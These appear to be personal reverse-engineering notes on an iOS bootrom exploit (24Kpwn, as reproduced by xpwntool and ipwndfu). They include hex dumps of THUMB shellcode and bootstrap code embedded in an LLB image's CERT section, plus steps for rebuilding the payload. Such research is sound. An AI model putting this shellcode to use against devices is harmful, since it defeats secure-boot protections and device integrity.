
16: 0x24000
10: 147456

Decrypted LLB DATA size:
1 << 16

Needed size is (1 << 16) + 81920

xpwntool:
10: 147920
16: 0x241d0

Extra size:
16: 0x1d0
10: 464

axi0mX's code copies bootstrap from ROM?

0x8400b000 + 0x8400b460

Ok, the actual payload in in CERT, not DATA (sort of).
The first 0x14/20 bytes are modified.

Seems like CERT for 24KPWN is the same, expect the end of CERT
is b'\x00' * 80014

Actually, everything is b'\x00' except 0x12e50 -> 0x12e9f (80 / 0x50)

This is THUMB code

00 00 00 00 00 00 00 00 00 00 00 00 09 48 0A 49
01 60 0A 48 0A 49 01 60 0B 48 85 46 1C BC 90 46
9A 46 A3 46 F0 BC 01 BC 06 48 00 21 01 60 07 48
00 47 00 00 CC 41 02 84 40 00 10 80 40 00 00 84 (0x840241cc) (0x80100040) (0x84000040)
9B D2 46 F1 30 3F 03 84 FC 3E 03 84 73 26 00 00


The end of the data, from 0x13e60 -> EOF is that bootstrap
code that axi0mX uses in ipwndfu. So xpwntool seems to be using
the same code/bootstrap stuff. Is SecureROM needed to get this
data, at least dynamically? Other wise, I need to diff to make
sure that this data is static (the same) across all iOS versions?

12 01 00 02 00 00 00 40 00 00 00 00 00 00 00 00
00 01 0A 06 00 02 00 00 00 40 01 00 20 40 02 84 (0x84024020)
20 40 02 84 04 09 00 00 30 40 02 84 6B 73 61 74 (0x84024020) (0x84024030) "ksat"
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
02 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 62 6F 6F 74 "boot"
73 74 72 61 70 00 00 00 00 00 00 00 32 6B 73 74 "strap" "2kst"
C4 40 02 84 C4 40 02 84 CC 40 02 84 CC 40 02 84 (0x840240c4) (0x840240c4) (0x840240cc) (0x840240cc)
01 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00
03 00 00 00 03 00 00 00 03 00 00 00 00 03 00 00
00 03 00 00 03 00 00 00 00 03 00 00 00 03 00 00
00 03 00 00 00 03 00 00 00 03 00 00 01 03 00 00
00 03 00 00 00 03 00 00 00 03 00 00 01 03 00 00
00 03 00 00 00 03 00 00 00 03 00 00 00 03 00 00
00 03 00 00 00 03 00 00 01 07 00 00 00 03 00 00
00 03 00 00 00 03 00 00 00 03 00 00 01 07 00 00
00 03 00 00 00 03 00 00 00 03 00 00 00 03 00 00
00 03 00 00 00 03 00 00 00 03 00 00 00 03 00 00
01 01 07 00 00 03 00 00 00 03 00 00 00 03 00 00
00 03 00 00 00 03 00 00 00 03 00 00 00 03 00 00
00 03 00 00 00 03 00 00 00 08 10 83 00 00 10 83
00 00 10 80 04 00 10 80 08 00 10 80 0C 00 10 80 (0x80100000) (0x80100004) (0x80100008) (0x8010000c)
10 00 10 80 20 00 10 80 24 00 10 80 28 00 10 80 (0x80100010) (0x80100020) (0x80100024) (0x80100028)
2C 00 10 80 30 00 10 80 F4 3D 03 84             (0x84033df4) (0x80100030) (0x8010002c)

DATA:
    First 4 bytes == 0x84023001

To "reproduce":
    1. At the end of CERT, we add b'\x00' * 0x126bf
    2. Add in the shellcode, which is 0x44 in len
    3. Then add another b'\x00' * 0xfc0
    4. Add bootstrap


4.0 CERT shellcode

09 48 0A 49 01 60 0A 48 0A 49 01 60 0B 48 85 46
1C BC 90 46 9A 46 A3 46 F0 BC 01 BC 06 48 00 21
01 60 07 48 00 47 00 00 CC 41 02 84 40 00 10 80
40 00 00 84 5E 7C A5 E5 30 3F 03 84 FC 3E 03 84
73 26 00 00 00 00 00 00 00 00 00 00 00 00 00 00
